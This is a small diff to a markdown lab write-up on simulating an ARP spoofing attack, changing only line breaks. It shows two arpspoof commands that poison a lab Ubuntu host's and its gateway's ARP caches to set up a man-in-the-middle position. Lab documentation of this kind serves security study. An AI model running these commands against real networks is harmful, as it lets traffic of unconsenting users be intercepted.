@@ -16,8 +16,8 @@ This section documents the steps used to simulate an ARP spoofing attack in the 
 
 ### 2. Launch ARP Spoofing Attack
 // Spoofing Ubuntu that i am the Gateway.
-`sudo arpspoof -i eth0 -t 192.168.56.20 192.168.56.1`
-// Spoofing Gateway that i am Ubuntu.
+`sudo arpspoof -i eth0 -t 192.168.56.20 192.168.56.1`\
+// Spoofing Gateway that i am Ubuntu.\
 `sudo arpspoof -i eth0 -t 192.168.56.1 192.168.56.20`
 
 > Replace `eth0` with the correct network interface.
